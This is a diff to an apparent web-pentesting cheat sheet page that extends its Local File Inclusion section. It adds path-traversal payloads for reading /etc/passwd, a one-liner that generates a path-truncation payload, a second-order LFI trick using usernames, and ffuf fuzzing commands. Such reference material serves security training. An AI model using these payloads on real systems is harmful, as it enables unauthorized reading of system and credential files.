@@ -756,6 +756,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#second-order-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Second order attacks
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1173,6 +1188,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#second-order-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Second order attacks
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1229,6 +1259,12 @@
 
 <h1 id="file-inclusion">File Inclusion</h1>
 <h2 id="local-file-inclusion">Local File Inclusion</h2>
+<ul>
+<li>Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows.</li>
+<li>If we find files on the web server (.php files for example), that return other status codes than 200 when fuzzing, these can still be viewed with LFI, so should not be ignored.</li>
+<li>If files get rendered during LFI we can encode them first, then decode to read the source code.</li>
+<li>If the web serrver adds a file extension like .php we do not need to add it when trying to LFI index.php, for example, to read the source code.</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1271,7 +1307,7 @@
 </tr>
 <tr>
 <td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
-<td>Bypass appended extension with path truncation (obsolete)</td>
+<td>Bypass appended extension with path truncation (obsolete) <code>echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done</code></td>
 </tr>
 <tr>
 <td><code>/index.php?language=../../../../etc/passwd%00</code></td>
@@ -1283,6 +1319,8 @@
 </tr>
 </tbody>
 </table>
+<h3 id="second-order-attacks">Second order attacks</h3>
+<p>Setting user names to <code>../../../../etc/passwd</code>, for example, could result in the LFI elsewhere the username is used.</p>
 <h2 id="remote-code-execution">Remote Code Execution</h2>
 <table>
 <thead>
@@ -1293,7 +1331,7 @@
 </thead>
 <tbody>
 <tr>
-<td><strong>PHP Wrappers</strong></td>
+<td><strong><a href="https://www.php.net/manual/en/wrappers.php.php">PHP Wrappers</a></strong></td>
 <td></td>
 </tr>
 <tr>
@@ -1375,6 +1413,11 @@
 </tbody>
 </table>
 <h2 id="misc">Misc</h2>
+<p><strong><a href="https://www.php.net/manual/en/filters.php">PHP filters</a></strong>
+- <a href="https://www.php.net/manual/en/filters.string.php">String Filters</a>
+- <a href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>
+- <a href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>
+- <a href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a></p>
 <table>
 <thead>
 <tr>
@@ -1383,6 +1426,10 @@
 </tr>
 </thead>
 <tbody>
+<tr>
+<td><code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php</code></td>
+<td>Fuzz for PHP files</td>
+</tr>
 <tr>
 <td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
 <td>Fuzz page parameters</td>
